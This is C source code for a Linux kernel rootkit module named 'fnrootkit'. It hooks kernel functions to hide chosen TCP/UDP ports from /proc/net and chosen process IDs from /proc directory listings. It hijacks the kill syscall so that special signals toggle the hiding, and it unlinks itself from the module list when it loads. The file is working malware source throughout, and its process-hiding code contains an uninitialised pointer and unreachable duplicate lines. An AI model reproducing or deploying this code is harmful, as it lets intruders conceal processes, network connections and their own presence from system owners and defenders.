#include "../inc/fnrootkit.h"

#include <linux/syscalls.h>

#include "../inc/def.h"
#include "../inc/util.h"

#include "../3rd_party/khook/engine.c"

/*************************HIDE CONNECTIONS*******************************/
#include "../inc/net.h"

#include <net/inet_sock.h>
#include <linux/seq_file.h>

LIST_HEAD(hidden_port_list);

KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
static int khook_tcp4_seq_show(struct seq_file *seq, void *v) {
    int ret;
    char port[12];
    struct hidden_port *hp;

    ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);

    list_for_each_entry (hp, &hidden_port_list, list) {
        sprintf(port, ":%04X", hp->port);

        if (strnstr(
                    seq->buf + seq->count - PROC_NET_ROW_LEN,
                    port,
                    PROC_NET_ROW_LEN
                )) {
            seq->count -= PROC_NET_ROW_LEN;
            break;
        }
    }

    return ret;
}

KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);
static int khook_udp4_seq_show(struct seq_file *seq, void *v) {
    int ret;
    char port[12];
    struct hidden_port *hp;

    ret = KHOOK_ORIGIN(udp4_seq_show, seq, v);

    list_for_each_entry (hp, &hidden_port_list, list) {
        sprintf(port, ":%04X", hp->port);

        if (strnstr(
                    seq->buf + seq->count - PROC_NET_ROW_LEN,
                    port,
                    PROC_NET_ROW_LEN
                )) {
            seq->count -= PROC_NET_ROW_LEN;
            break;
        }
    }

    return ret;
}

KHOOK_EXT(int, tcp6_seq_show, struct seq_file *, void *);
static int khook_tcp6_seq_show(struct seq_file *seq, void *v) {
    int ret;
    char port[12];
    struct hidden_port *hp;

    ret = KHOOK_ORIGIN(tcp6_seq_show, seq, v);

    list_for_each_entry (hp, &hidden_port_list, list) {
        sprintf(port, ":%04X", hp->port);

        if (strnstr(
                    seq->buf + seq->count - PROC_NET6_ROW_LEN,
                    port,
                    PROC_NET6_ROW_LEN
                )) {
            seq->count -= PROC_NET6_ROW_LEN;
            break;
        }
    }

    return ret;
}

KHOOK_EXT(int, udp6_seq_show, struct seq_file *, void *);
static int khook_udp6_seq_show(struct seq_file *seq, void *v) {
    int ret;
    char port[12];
    struct hidden_port *hp;

    ret = KHOOK_ORIGIN(udp6_seq_show, seq, v);

    list_for_each_entry (hp, &hidden_port_list, list) {
        sprintf(port, ":%04X", hp->port);

        if (strnstr(
                    seq->buf + seq->count - PROC_NET6_ROW_LEN,
                    port,
                    PROC_NET6_ROW_LEN
                )) {
            seq->count -= PROC_NET6_ROW_LEN;
            break;
        }
    }

    return ret;
}

/**************************HIDE PROCESSES********************************/
#include "../inc/proc.h"

#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/fdtable.h>

KHOOK_EXT(long, __x64_sys_getdents, const struct pt_regs *);
static long khook___x64_sys_getdents(const struct pt_regs *pt_regs) {
    int fd; 
    long ret;
    long off = 0;

    struct inode *d_inode;
    struct linux_dirent *dirent, *kdirent, *dirent_var, *dirent_prev;

    fd = (int)pt_regs->di;
    dirent = (struct linux_dirent *)pt_regs->si;

    ret = KHOOK_ORIGIN(__x64_sys_getdents, pt_regs);
    if (ret <= 0)
        return ret;

    d_inode =
        current->files->fdt->fd[fd]->f_path.dentry->d_inode;
    if (d_inode->i_ino != PROC_ROOT_INO)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    while (off < ret) {
        dirent_var = (void *)kdirent + off;

        if (is_invisible_pid(str_to_pid(dirent_var->d_name))) {
            if (!dirent_prev) { // <==> if (dirent_var == kdirent)
                memmove(
                    dirent_var, (void *)dirent_var + dirent_var->d_reclen, ret
                );
                ret -= dirent_var->d_reclen;
            }
            else {
                dirent_prev->d_reclen += dirent_var->d_reclen;
                off += dirent_var->d_reclen;
            }
        }
        else {
            dirent_prev = dirent_var;
            off += dirent_var->d_reclen;
        }
    }

    copy_to_user(dirent, kdirent, ret);
    kfree(kdirent);

    return ret;

    copy_to_user(dirent, kdirent, ret);
    kfree(kdirent);

    return ret;
}

KHOOK_EXT(long, __x64_sys_getdents64, const struct pt_regs *);
static long khook___x64_sys_getdents64(const struct pt_regs *pt_regs) {
    int fd; 
    long ret;
    long off = 0;

    struct inode *d_inode;
    struct linux_dirent64 *dirent, *kdirent, *dirent_var, *dirent_prev;

    fd = (int)pt_regs->di;
    dirent = (struct linux_dirent64 *)pt_regs->si;

    ret = KHOOK_ORIGIN(__x64_sys_getdents64, pt_regs);
    if (ret <= 0)
        return ret;

    d_inode =
        current->files->fdt->fd[fd]->f_path.dentry->d_inode;
    if (d_inode->i_ino != PROC_ROOT_INO)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    while (off < ret) {
        dirent_var = (void *)kdirent + off;

        if (is_invisible_pid(str_to_pid(dirent_var->d_name))) {
            if (!dirent_prev) { // <==> if (dirent_var == kdirent)
                memmove(
                    dirent_var, (void *)dirent_var + dirent_var->d_reclen, ret
                );
                ret -= dirent_var->d_reclen;
            }
            else {
                dirent_prev->d_reclen += dirent_var->d_reclen;
                off += dirent_var->d_reclen;
            }
        }
        else {
            dirent_prev = dirent_var;
            off += dirent_var->d_reclen;
        }
    }

    copy_to_user(dirent, kdirent, ret);
    kfree(kdirent);

    return ret;
}

void toggle_module_invisability(void);

KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
static long khook___x64_sys_kill(const struct pt_regs *pt_regs) {
    struct task_struct *task;
    pid_t pid = (pid_t) pt_regs->di;
    int sig = (int) pt_regs->si;

    switch (sig) {
    case SIGINVISPROC:
        if ((task = find_task_struct(pid)))
            toggle_proc_invisability(task);
        else
            return ESRCH;
        break;
    case SIGINVISPORT:
        toggle_port_invisability(pid);
        break;
    case SIGMODHIDE:
        toggle_module_invisability();
        break;
    default:
        KHOOK_ORIGIN(__x64_sys_kill, pt_regs);
    }

    return 0;
}

/********************************LKM*************************************/
static struct list_head *module_prev;
static int is_module_hidden = 0;

void module_hide(void) {
    if (!is_module_hidden) {
        module_prev = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);

        is_module_hidden = 1;
    }
}

void module_show(void) {
    if (is_module_hidden) {
        list_add(&THIS_MODULE->list, module_prev);
        is_module_hidden = 0;
    }
}

void toggle_module_invisability() {
    if (is_module_hidden)
        module_show();
    else
        module_hide();
}

 int __init fnrootkit_init(void) {
    khook_init();
    module_hide();

    printk(KERN_INFO "fnrootkit: module have loaded.\n");

    return 0;
}

static void __exit fnrootkit_exit(void) {
    khook_cleanup();

    printk(KERN_INFO "fnrootkit: module have unloaded.\n");
}
 
module_init(fnrootkit_init);
module_exit(fnrootkit_exit);
